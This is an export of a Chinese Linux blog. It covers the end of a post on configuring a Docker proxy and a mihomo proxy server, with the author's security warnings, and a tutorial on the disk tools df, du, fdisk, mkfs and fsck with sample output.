<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">mkdir</span> -p /etc/systemd/system/docker.service.d</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p>为 dockerd 创建 HTTP/HTTPS 网络代理的配置文件，文件路径是 /etc/systemd/system/docker.service.d/http-proxy.conf 。并在该文件中添加相关环境变量。</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Service]</span><br><span class="line">Environment=<span class="string">&quot;HTTP_PROXY=http://user:password@ip:port/&quot;</span></span><br><span class="line">Environment=<span class="string">&quot;HTTPS_PROXY=http://user:password@ip:port/&quot;</span></span><br><span class="line">Environment=<span class="string">&quot;NO_PROXY=localhost,127.0.0.1,.example.com&quot;</span></span><br></pre></td></tr></table></figure>
<p><font class="notice">注意：如果没有密码就不添加 <code>user:password@</code> （建议设置密码）</font></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>刷新配置并重启 docker 服务。</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl daemon-reload</span><br><span class="line"><span class="built_in">sudo</span> systemctl restart docker</span><br></pre></td></tr></table></figure>
<p><font class="notice">注意：使用 <code>docker info</code> 可以查看docker配置信息</font></p>
<p>经过我不断的测试，我本地的电脑总是会出现无法使用服务器的代理访问外网的情况，通常需要我进入Web控制页面换几个代理才可以。这样一来非常的麻烦，因此我放弃了这么操作。为了方便，当我的本地机器（虚拟机）需要使用代理时，直接使用我主机的代理。而为了云服务器的安全，直接将云服务器的代理对外关闭了。</p>
<h2 id="客户端使用代理">客户端使用代理</h2>
<p>因为代理是部署在服务器的，因此自己的手机、电脑、平板等也可以使用服务器的代理。修改配置文件allow-lan改为true即可（危险）。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">allow-lan: <span class="literal">true</span></span><br><span class="line">authentication:</span><br><span class="line">  - <span class="string">&quot;user:password&quot;</span>   <span class="comment"># 格式：用户名:密码（可配置多组）</span></span><br></pre></td></tr></table></figure>
<p>但是不得不说，如果你的服务器在公网，那么这是一件很危险的事情，因此至少需要给你的代理设置密码，也可以绑定IP白名单。</p>
<p>我试了一下，如果手机不用工具的话使用用户名密码访问不了公网，需要安装代理工具。</p>
<h2 id="详细配置说明">详细配置说明</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ==== 核心代理配置 ====</span></span><br><span class="line"><span class="comment"># 混合代理端口（同时支持 HTTP 和 SOCKS5 协议）</span></span><br><span class="line">mixed-port: 7890  <span class="comment"># 客户端（浏览器/Docker等）通过此端口连接代理</span></span><br><span class="line"><span class="comment"># 是否允许局域网内其他设备连接代理（如果本机在公网，那就都可以连接了）</span></span><br><span class="line">allow-lan: <span class="literal">true</span>   <span class="comment"># true:允许同一局域网设备使用代理 | false:仅本机可用</span></span><br><span class="line"><span class="comment"># 绑定地址（* 表示允许所有网络接口，包括公网和本地）</span></span><br><span class="line">bind-address: <span class="string">&#x27;*&#x27;</span># 若需限制访问IP，可改为 127.0.0.1（仅本机）或特定IP</span><br><span class="line"><span class="comment"># 代理模式（rule:基于规则分流 | global:全局代理 | direct:直连）</span></span><br><span class="line">mode: rule</span><br><span class="line"></span><br><span class="line"><span class="comment"># ==== 日志配置 ====</span></span><br><span class="line"><span class="comment"># 日志级别（debug/info/warning/error/silent）</span></span><br><span class="line">log-level: info</span><br><span class="line"><span class="comment"># 日志文件路径（需确保目录存在且 mihomo 有写入权限）建议定期清理或配置 logrotate</span></span><br><span class="line">log-file: /var/log/mihomo.log  <span class="comment">#日志保存地址</span></span><br><span class="line"><span class="comment">#远程连接时使用的用户和密码（可以多个）密码务必高强度</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==== 代理认证配置 ====</span></span><br><span class="line"><span class="comment"># HTTP/SOCKS5 代理的客户端认证（非控制面板密码）</span></span><br><span class="line">authentication:</span><br><span class="line">  - <span class="string">&quot;user1:pass1&quot;</span>   <span class="comment"># 格式：用户名:密码（可配置多组）</span></span><br><span class="line">  <span class="comment"># - &quot;user2:pass2&quot;          # 客户端连接需填写对应用户名密码</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==== 控制面板配置 ====</span></span><br><span class="line"><span class="comment"># Web 控制面板监听地址（强烈建议绑定到 127.0.0.1 避免公网暴露）</span></span><br><span class="line"><span class="comment">#0.0.0.0表示所有ip均可访问</span></span><br><span class="line"><span class="comment">#127.0.0.1表示只有本机可以访问</span></span><br><span class="line">external-controller: <span class="string">&#x27;127.0.0.1:7891&#x27;</span>  </span><br><span class="line">secret: <span class="string">&quot;********&quot;</span>  <span class="comment">#web页面密码，访问 http://IP:7891/ui 时需输入此密码，建议高强度</span></span><br><span class="line">external-ui: /etc/mihomo/ui <span class="comment"># Web 面板静态文件路径（需确保目录存在）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==== 高级网络配置 ====</span></span><br><span class="line"><span class="comment"># 统一延迟测试（true:所有节点同时测速 | false:按需测速）</span></span><br><span class="line">unified-delay: <span class="literal">true</span></span><br><span class="line"><span class="comment"># 启用 TCP 并发连接提升速度（可能增加服务器负载）</span></span><br><span class="line">tcp-concurrent: <span class="literal">true</span></span><br><span class="line">dns:</span><br><span class="line">.................</span><br><span class="line">proxies:</span><br><span class="line">.................</span><br><span class="line">rule：</span><br><span class="line">.................</span><br></pre></td></tr></table></figure>
<h2 id="遇到的问题：">遇到的问题：</h2>
<ol>
<li class="lvl-3">
<p>网上说mihomo的配置文件和clash是一样的，因此要把订阅链接转换成clash的订阅链接，可是我转换后并不能成功使用。经过进一步的了解得知mihomo是clash meta的更新，随后转成meta链接成功（在订阅链接后加<code>&amp;flag=meta</code>）。</p>
</li>
<li class="lvl-3">
<p>为docker更换源、使用阿里加速器。然而尝试了各种源均没有什么卵用，只有个别镜像拉取成功，并且就算docker配置成功了，我还是没办法直接下载github的资源。</p>
</li>
<li class="lvl-3">
<p>使用clash代理，然而我花好久终于要整好的时候，clash并不支持我的配置文件中<code>type: hysteria2</code>，也就是不支持hysteria2协议。一时间手足无措，最后在一篇文章里看到mihomo支持，最后配置成功。</p>
</li>
</ol>
<p>本文参考：</p>
<p><a href="https://yeasy.gitbook.io/docker_practice/">Docker — 从入门到实践</a></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>基础知识</category>
        <category>Linux</category>
        <category>Linux进阶</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux】磁盘管理</title>
    <url>/posts/bdf9e69e/</url>
    <content><![CDATA[<h3 id="Linux-磁盘管理">Linux 磁盘管理</h3>
<p>Linux磁盘管理常用三个命令为df、du和fdisk。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>df：列出文件系统的整体磁盘使用量</p>
</li>
<li class="lvl-2">
<p>du：检查磁盘空间使用量</p>
</li>
<li class="lvl-2">
<p>fdisk：用于磁盘分区</p>
</li>
</ul>
<span id="more"></span>
<hr>
<h4 id="df">df</h4>
<p>获取硬盘被占用了多少空间，目前还剩下多少空间等信息。</p>
<p>语法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">df</span> [-ahikHTm] [目录或文件名]</span><br></pre></td></tr></table></figure>
<p>选项与参数：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-a ：列出所有的文件系统，包括系统特有的 /proc 等文件系统；</p>
</li>
<li class="lvl-2">
<p>-k ：以 KBytes 的容量显示各文件系统；</p>
</li>
<li class="lvl-2">
<p>-m ：以 MBytes 的容量显示各文件系统；</p>
</li>
<li class="lvl-2">
<p>-h ：以人们较易阅读的 GBytes, MBytes, KBytes 等格式自行显示；</p>
</li>
<li class="lvl-2">
<p>-H ：以 M=1000K 取代 M=1024K 的进位方式；</p>
</li>
<li class="lvl-2">
<p>-T ：显示文件系统类型, 连同该 partition 的 filesystem 名称 (例如 ext3) 也列出；</p>
</li>
<li class="lvl-2">
<p>-i ：不用硬盘容量，而以 inode 的数量来显示</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">df</span> -Th</span><br><span class="line">Filesystem          Type      Size  Used Avail Use% Mounted on</span><br><span class="line">devtmpfs            devtmpfs  854M     0  854M   0% /dev</span><br><span class="line">tmpfs               tmpfs     874M     0  874M   0% /dev/shm</span><br><span class="line">tmpfs               tmpfs     874M  8.7M  865M   1% /run</span><br><span class="line">tmpfs               tmpfs     874M     0  874M   0% /sys/fs/cgroup</span><br><span class="line">/dev/mapper/rl-root xfs        70G  2.9G   68G   5% /</span><br><span class="line">/dev/sda1           xfs      1014M  199M  816M  20% /boot</span><br><span class="line">/dev/mapper/rl-home xfs       127G  939M  126G   1% /home</span><br><span class="line">tmpfs               tmpfs     175M     0  175M   0% /run/user/0</span><br></pre></td></tr></table></figure>
<p>将系统内的所有特殊文件格式及名称都列出来</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">df</span> -aT</span><br><span class="line">Filesystem          Type       1K-blocks    Used Available Use% Mounted on</span><br><span class="line">sysfs               sysfs              0       0         0    - /sys</span><br><span class="line">proc                proc               0       0         0    - /proc</span><br><span class="line">devtmpfs            devtmpfs      874420       0    874420   0% /dev</span><br><span class="line">securityfs          securityfs         0       0         0    - /sys/kernel/security</span><br><span class="line">tmpfs               tmpfs         894176       0    894176   0% /dev/shm</span><br><span class="line">devpts              devpts             0       0         0    - /dev/pts</span><br><span class="line">tmpfs               tmpfs         894176    8896    885280   1% /run</span><br><span class="line">tmpfs               tmpfs         894176       0    894176   0% /sys/fs/cgroup</span><br><span class="line">cgroup              cgroup             0       0         0    - /sys/fs/cgroup/systemd</span><br><span class="line">pstore              pstore             0       0         0    - /sys/fs/pstore</span><br><span class="line">bpf                 bpf                0       0         0    - /sys/fs/bpf</span><br><span class="line">...................</span><br></pre></td></tr></table></figure>
<h4 id="du">du</h4>
<p>du命令是对文件和目录磁盘使用的空间的查看。du命令用于统计目录或文件所占磁盘空间的大小，该命令的执行结果与df类似，du更侧重于磁盘的使用状况。</p>
<p>语法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">du</span> [选项] 文件或目录名称</span><br></pre></td></tr></table></figure>
<p>选项与参数：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-a ：列出所有的文件与目录容量，因为默认仅统计目录底下的文件量而已。</p>
</li>
<li class="lvl-2">
<p>-h ：以人们较易读的容量格式 (G/M) 显示；</p>
</li>
<li class="lvl-2">
<p>-s ：列出总量而已，而不列出每个各别的目录占用容量；</p>
</li>
<li class="lvl-2">
<p>-S ：不包括子目录下的总计，与 -s 有点差别。</p>
</li>
<li class="lvl-2">
<p>-k ：以 KBytes 列出容量显示；</p>
</li>
<li class="lvl-2">
<p>-m ：以 MBytes 列出容量显示；</p>
</li>
</ul>
<p>du直接加文件，可以打印文件的大小</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">du</span> 1.txt </span><br><span class="line">4	1.txt</span><br><span class="line">[root@rocky8:~]# <span class="built_in">du</span> -h 1.txt </span><br><span class="line">4.0K	1.txt</span><br></pre></td></tr></table></figure>
<p>du没有加任何选项时，只列出当前目录下的所有文件夹容量（包括隐藏文件夹）:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">du</span></span><br><span class="line">0	./test1     &lt;==每个目录都会列出来</span><br><span class="line">0	./test2</span><br><span class="line">0	./test3</span><br><span class="line">0	./.config/procps   &lt;==包括隐藏文件的目录</span><br><span class="line">0	./.config/htop</span><br><span class="line">0	./.config</span><br><span class="line">44	.           &lt;==这个目录(.)所占用的总量</span><br></pre></td></tr></table></figure>
<p>直接输入 du 没有加任何选项时，则 du 会分析当前所在目录的文件与目录所占用的硬盘空间。</p>
<p>加<code>-a</code>选项才显示文件的容量：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">du</span> -a</span><br><span class="line">4	./.bash_logout</span><br><span class="line">4	./.bash_profile</span><br><span class="line">4	./.bashrc</span><br><span class="line">4	./.cshrc</span><br><span class="line">....中间省略....</span><br><span class="line">0	./.config/htop</span><br><span class="line">0	./.config</span><br><span class="line">44	.</span><br></pre></td></tr></table></figure>
<p>检查根目录底下每个目录所占用的容量</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">du</span> -sh /*</span><br><span class="line">0	/bin</span><br><span class="line">159M	/boot</span><br><span class="line">0	/dev</span><br><span class="line">25M	/etc</span><br><span class="line">.....中间省略....</span><br><span class="line">0	/proc</span><br><span class="line">.....中间省略....</span><br><span class="line">8.0K	/tmp</span><br><span class="line">2.1G	/usr</span><br><span class="line">253M	/var</span><br></pre></td></tr></table></figure>
<h4 id="fdisk">fdisk</h4>
<p><strong>!!!   为保证我的Linux系统的正常使用，从磁盘分割和格式化及其以后的内容，暂未编写博客   !!!</strong></p>
<p>fdisk 是 Linux 的磁盘分区表操作工具。</p>
<p>语法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fdisk [-l] 装置名称</span><br></pre></td></tr></table></figure>
<p>选项与参数：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-l ：输出后面接的装置所有的分区内容。若仅有 fdisk -l 时， 则系统将会把整个系统内能够搜寻到的装置的分区均列出来。</p>
</li>
</ul>
<p>列出所有分区信息：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# fdisk -l</span><br><span class="line">Disk /dev/sda: 200 GiB, 214748364800 bytes, 419430400 sectors</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disklabel <span class="built_in">type</span>: dos</span><br><span class="line">Disk identifier: 0x9d182722</span><br><span class="line"></span><br><span class="line">Device     Boot   Start       End   Sectors  Size Id Type</span><br><span class="line">/dev/sda1  *       2048   2099199   2097152    1G 83 Linux</span><br><span class="line">/dev/sda2       2099200 419430399 417331200  199G 8e Linux LVM</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disk /dev/mapper/rl-root: 70 GiB, 75161927680 bytes, 146800640 sectors</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disk /dev/mapper/rl-swap: 2 GiB, 2168455168 bytes, 4235264 sectors</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disk /dev/mapper/rl-home: 127 GiB, 136340045824 bytes, 266289152 sectors</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br></pre></td></tr></table></figure>
<p>查看根目录所在磁盘，并查阅该硬盘内的相关信息：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">df</span> /            &lt;==注意：重点在找出磁盘文件名而已</span><br><span class="line">Filesystem          1K-blocks    Used Available Use% Mounted on</span><br><span class="line">/dev/mapper/rl-root  73364480 2995664  70368816   5% /</span><br><span class="line">[root@rocky8:~]# fdisk /dev/mapper/rl-root  &lt;==不要加上数字！</span><br><span class="line"></span><br><span class="line">Welcome to fdisk (util-linux 2.32.1).</span><br><span class="line">Changes will remain <span class="keyword">in</span> memory only, <span class="keyword">until</span> you decide to write them.</span><br><span class="line">Be careful before using the write <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">The old xfs signature will be removed by a write <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">Device does not contain a recognized partition table.</span><br><span class="line">Created a new DOS disklabel with disk identifier 0xbb210c3d.</span><br><span class="line"></span><br><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>):      &lt;==等待你的输入！</span><br></pre></td></tr></table></figure>
<p>输入 m 后，就会看到底下这些命令介绍</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Command (m <span class="keyword">for</span> help): m</span><br><span class="line"></span><br><span class="line">Help:</span><br><span class="line"></span><br><span class="line">  DOS (MBR)</span><br><span class="line">   a   toggle a bootable flag</span><br><span class="line">   b   edit nested BSD disklabel</span><br><span class="line">   c   toggle the dos compatibility flag</span><br><span class="line"></span><br><span class="line">  Generic</span><br><span class="line">   d   <span class="keyword">delete</span> a <span class="keyword">partition</span>            <span class="operator">&lt;=</span><span class="operator">=</span>删除一个<span class="keyword">partition</span></span><br><span class="line">   F   list <span class="keyword">free</span> unpartitioned space</span><br><span class="line">   l   list known <span class="keyword">partition</span> types</span><br><span class="line">   n   <span class="keyword">add</span> a <span class="keyword">new</span> <span class="keyword">partition</span>           <span class="operator">&lt;=</span><span class="operator">=</span>新增一个<span class="keyword">partition</span></span><br><span class="line">   p   print the <span class="keyword">partition</span> <span class="keyword">table</span>     <span class="operator">&lt;=</span><span class="operator">=</span>在屏幕上显示分割表</span><br><span class="line">   t   change a <span class="keyword">partition</span> type</span><br><span class="line">   v   verify the <span class="keyword">partition</span> <span class="keyword">table</span></span><br><span class="line">   i   print information about a <span class="keyword">partition</span></span><br><span class="line"></span><br><span class="line">  Misc</span><br><span class="line">   m   print this menu</span><br><span class="line">   u   change display<span class="operator">/</span>entry units</span><br><span class="line">   x   extra functionality (experts <span class="keyword">only</span>)</span><br><span class="line"></span><br><span class="line">  Script</span><br><span class="line">   I   load disk layout <span class="keyword">from</span> sfdisk script file</span><br><span class="line">   O   dump disk layout <span class="keyword">to</span> sfdisk script file</span><br><span class="line"></span><br><span class="line">  Save <span class="operator">&amp;</span> Exit</span><br><span class="line">   w   write <span class="keyword">table</span> <span class="keyword">to</span> disk <span class="keyword">and</span> exit  <span class="operator">&lt;=</span><span class="operator">=</span>将刚刚的动作写入分割表</span><br><span class="line">   q   quit <span class="keyword">without</span> saving changes   <span class="operator">&lt;=</span><span class="operator">=</span>不储存离开fdisk程序</span><br><span class="line"></span><br><span class="line">  <span class="keyword">Create</span> a <span class="keyword">new</span> label</span><br><span class="line">   g   <span class="keyword">create</span> a <span class="keyword">new</span> <span class="keyword">empty</span> GPT <span class="keyword">partition</span> <span class="keyword">table</span></span><br><span class="line">   G   <span class="keyword">create</span> a <span class="keyword">new</span> <span class="keyword">empty</span> SGI (IRIX) <span class="keyword">partition</span> <span class="keyword">table</span></span><br><span class="line">   o   <span class="keyword">create</span> a <span class="keyword">new</span> <span class="keyword">empty</span> DOS <span class="keyword">partition</span> <span class="keyword">table</span></span><br><span class="line">   s   <span class="keyword">create</span> a <span class="keyword">new</span> <span class="keyword">empty</span> Sun <span class="keyword">partition</span> <span class="keyword">table</span></span><br></pre></td></tr></table></figure>
<p>离开 fdisk 时按下 <code>q</code>，那么所有的动作都不会生效！相反的， 按下<code>w</code>就是动作生效的意思。</p>
<p>这个是我的本地虚拟机：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): p  &lt;== 这里可以输出目前磁盘的状态</span><br><span class="line">Disk /dev/mapper/rl-root: 70 GiB, 75161927680 bytes, 146800640 sectors</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disklabel <span class="built_in">type</span>: dos</span><br><span class="line">Disk identifier: 0xbb210c3d</span><br><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): q</span><br></pre></td></tr></table></figure>
<p>这个是我的云服务器：</p>
<figure class="highlight tap"><table><tr><td class="code"><pre><span class="line">Command (m for help): p</span><br><span class="line"></span><br><span class="line">Disk /dev/vda:<span class="number"> 40 </span>GiB,<span class="number"> 42949672960 </span>bytes,<span class="number"> 83886080 </span>sectors</span><br><span class="line">Units: sectors of<span class="number"> 1 </span>*<span class="number"> 512 </span>=<span class="number"> 512 </span>bytes</span><br><span class="line">Sector size (logical/physical):<span class="number"> 512 </span>bytes /<span class="number"> 512 </span>bytes</span><br><span class="line">I/O size (minimum/optimal):<span class="number"> 512 </span>bytes /<span class="number"> 512 </span>bytes</span><br><span class="line">Disklabel type: gpt</span><br><span class="line">Disk identifier: 8E31C5C4-D56B-4F46-A42F-54B90BC33E0C</span><br><span class="line"></span><br><span class="line">Device      Start      End  Sectors  Size Type</span><br><span class="line">/dev/vda1   <span class="number"> 2048 </span>   <span class="number"> 4095 </span>   <span class="number"> 2048 </span>   1M BIOS boot</span><br><span class="line">/dev/vda2   <span class="number"> 4096 </span> <span class="number"> 208895 </span> <span class="number"> 204800 </span> 100M EFI System</span><br><span class="line">/dev/vda3 <span class="number"> 208896 </span>83886046<span class="number"> 83677151 </span>39.9G Linux filesystem</span><br><span class="line">Command (m for help): q</span><br></pre></td></tr></table></figure>
<p>这个是本博客转载原文：</p>
<figure class="highlight tap"><table><tr><td class="code"><pre><span class="line">Command (m for help): p  &lt;== 这里可以输出目前磁盘的状态</span><br><span class="line"></span><br><span class="line">Disk /dev/hdc: 41.1 GB,<span class="number"> 41174138880 </span>bytes        &lt;==这个磁盘的文件名与容量</span><br><span class="line">255 heads,<span class="number"> 63 </span>sectors/track,<span class="number"> 5005 </span>cylinders      &lt;==磁头、扇区与磁柱大小</span><br><span class="line">Units = cylinders of<span class="number"> 16065 </span>*<span class="number"> 512 </span>=<span class="number"> 8225280 </span>bytes &lt;==每个磁柱的大小</span><br><span class="line"></span><br><span class="line">   Device Boot      Start         End      Blocks   Id  System</span><br><span class="line">/dev/hdc1   *          <span class="number"> 1 </span>        <span class="number"> 13 </span>    <span class="number"> 104391 </span> <span class="number"> 83 </span> Linux</span><br><span class="line">/dev/hdc2             <span class="number"> 14 </span>      <span class="number"> 1288 </span>   10241437+ <span class="number"> 83 </span> Linux</span><br><span class="line">/dev/hdc3           <span class="number"> 1289 </span>      <span class="number"> 1925 </span>    5116702+ <span class="number"> 83 </span> Linux</span><br><span class="line">/dev/hdc4           <span class="number"> 1926 </span>      <span class="number"> 5005 </span>  <span class="number"> 24740100 </span>  <span class="number"> 5 </span> Extended</span><br><span class="line">/dev/hdc5           <span class="number"> 1926 </span>      <span class="number"> 2052 </span>   <span class="number"> 1020096 </span> <span class="number"> 82 </span> Linux swap / Solaris</span><br><span class="line"><span class="comment"># 装置文件名 启动区否 开始磁柱    结束磁柱  1K大小容量 磁盘分区槽内的系统</span></span><br><span class="line"></span><br><span class="line">Command (m for help): q</span><br></pre></td></tr></table></figure>
<p>使用 <code>p</code> 可以列出目前这颗磁盘的分割表信息，这个信息的上半部在显示整体磁盘的状态。</p>
<h4 id="磁盘格式化">磁盘格式化</h4>
<p>磁盘分割完毕后自然就是要进行文件系统的格式化，格式化的命令非常的简单，使用 <code>mkfs</code>（make filesystem） 命令。</p>
<p>语法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkfs [-t 文件系统格式] 装置文件名</span><br></pre></td></tr></table></figure>
<p>选项与参数：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-t ：可以接文件系统格式，例如 ext3, ext2, vfat 等(系统有支持才会生效)</p>
</li>
</ul>
<p>查看 mkfs 支持的文件格式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@VM_0_9_centos web]# mkfs[tab]</span><br><span class="line">mkfs         mkfs.cramfs  mkfs.ext3    mkfs.minix   </span><br><span class="line">mkfs.btrfs   mkfs.ext2    mkfs.ext4    mkfs.xfs</span><br></pre></td></tr></table></figure>
<p>按下两个[tab]，会发现 mkfs 支持的文件格式如上所示。</p>
<p>将分区 /dev/hdc6（可指定其他分区） 格式化为ext3文件系统：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">[root@www ~]# mkfs -t ext3 /dev/hdc6</span><br><span class="line">mke2fs 1.39 (29-May-2006)</span><br><span class="line">Filesystem label=                &lt;==这里指的是分割槽的名称(label)</span><br><span class="line">OS type: Linux</span><br><span class="line">Block <span class="attribute">size</span>=4096 (<span class="attribute">log</span>=2)          &lt;==block 的大小配置为 4K </span><br><span class="line">Fragment <span class="attribute">size</span>=4096 (<span class="attribute">log</span>=2)</span><br><span class="line">251392 inodes, 502023 blocks     &lt;==由此配置决定的inode/block数量</span><br><span class="line">25101 blocks (5.00%) reserved <span class="keyword">for</span> the super<span class="built_in"> user</span></span><br><span class="line"><span class="built_in"></span>First data <span class="attribute">block</span>=0</span><br><span class="line">Maximum filesystem <span class="attribute">blocks</span>=515899392</span><br><span class="line">16 block groups</span><br><span class="line">32768 blocks per group, 32768 fragments per<span class="built_in"> group</span></span><br><span class="line"><span class="built_in"></span>15712 inodes per<span class="built_in"> group</span></span><br><span class="line"><span class="built_in"></span>Superblock backups stored on blocks:</span><br><span class="line">        32768, 98304, 163840, 229376, 294912</span><br><span class="line"></span><br><span class="line">Writing inode tables: done</span><br><span class="line">Creating journal (8192 blocks): done &lt;==有日志记录</span><br><span class="line">Writing superblocks <span class="keyword">and</span> filesystem<span class="built_in"> accounting </span>information: done</span><br><span class="line"></span><br><span class="line">This filesystem will be automatically checked every 34 mounts <span class="keyword">or</span></span><br><span class="line">180 days, whichever comes first.  Use tune2fs -c <span class="keyword">or</span> -i <span class="keyword">to</span> override.</span><br><span class="line"><span class="comment"># 这样就创建起来我们所需要的 Ext3 文件系统了！简单明了！</span></span><br><span class="line">1234567891011121314151617181920212223</span><br></pre></td></tr></table></figure>
<h4 id="磁盘检验">磁盘检验</h4>
<p>fsck（file system check）用来检查和维护不一致的文件系统。</p>
<p>若系统掉电或磁盘发生问题，可利用fsck命令对文件系统进行检查。</p>
<p>语法：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">fsck <span class="selector-attr">[-t 文件系统]</span> <span class="selector-attr">[-ACay]</span> 装置名称</span><br></pre></td></tr></table></figure>
<p>选项与参数：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-t : 给定档案系统的型式，若在 /etc/fstab 中已有定义或 kernel 本身已支援的则不需加上此参数</p>
</li>
<li class="lvl-2">
<p>-s : 依序一个一个地执行 fsck 的指令来检查</p>
</li>
<li class="lvl-2">
<p>-A : 对/etc/fstab 中所有列出来的 分区（partition）做检查</p>
</li>
<li class="lvl-2">
<p>-C : 显示完整的检查进度</p>
</li>
<li class="lvl-2">
<p>-d : 打印出 e2fsck 的 debug 结果</p>
</li>
<li class="lvl-2">
<p>-p : 同时有 -A 条件时，同时有多个 fsck 的检查一起执行</p>
</li>
<li class="lvl-2">
<p>-R : 同时有 -A 条件时，省略 / 不检查</p>
</li>
<li class="lvl-2">
<p>-V : 详细显示模式</p>
</li>
<li class="lvl-2">
<p>-a : 如果检查有错则自动修复</p>
</li>
<li class="lvl-2">
<p>-r : 如果检查有错则由使用者回答是否修复</p>
</li>
<li class="lvl-2">
<p>-y : 选项指定检测每个文件是自动输入yes，在不确定那些是不正常的时候，可以执行 # fsck -y 全部检查修复。</p>
</li>
</ul>
<p>查看系统有多少文件系统支持的 fsck 命令：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-attr">[root@www ~]</span># fsck<span class="selector-attr">[tab]</span><span class="selector-attr">[tab]</span></span><br><span class="line">fsck         fsck<span class="selector-class">.cramfs</span>  fsck<span class="selector-class">.ext2</span>    fsck<span class="selector-class">.ext3</span>    fsck<span class="selector-class">.msdos</span>   fsck<span class="selector-class">.vfat</span></span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></table></figure>
<p>强制检测 /dev/hdc6 分区:</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line">[<span class="string">root@www</span> <span class="string">~</span>]<span class="comment"># fsck -C -f -t ext3 /dev/hdc6 </span></span><br><span class="line"><span class="string">fsck</span> <span class="number">1.39</span> <span class="string">(29-May-2006)</span></span><br><span class="line"><span class="string">e2fsck</span> <span class="number">1.39</span> <span class="string">(29-May-2006)</span></span><br><span class="line"><span class="attr">Pass 1:</span> <span class="string">Checking</span> <span class="string">inodes,</span> <span class="string">blocks,</span> <span class="string">and</span> <span class="string">sizes</span></span><br><span class="line"><span class="attr">Pass 2:</span> <span class="string">Checking</span> <span class="string">directory</span> <span class="string">structure</span></span><br><span class="line"><span class="attr">Pass 3:</span> <span class="string">Checking</span> <span class="string">directory</span> <span class="string">connectivity</span></span><br><span class="line"><span class="attr">Pass 4:</span> <span class="string">Checking</span> <span class="string">reference</span> <span class="string">counts</span></span><br><span class="line"><span class="attr">Pass 5:</span> <span class="string">Checking</span> <span class="string">group</span> <span class="string">summary</span> <span class="string">information</span></span><br><span class="line"><span class="attr">vbird_logical:</span> <span class="number">11</span><span class="string">/251968</span> <span class="string">files</span> <span class="string">(9.1%</span> <span class="string">non-contiguous),</span> <span class="number">36926</span><span class="string">/1004046</span> <span class="string">blocks</span></span><br><span class="line"><span class="number">123456789</span></span><br></pre></td></tr></table></figure>
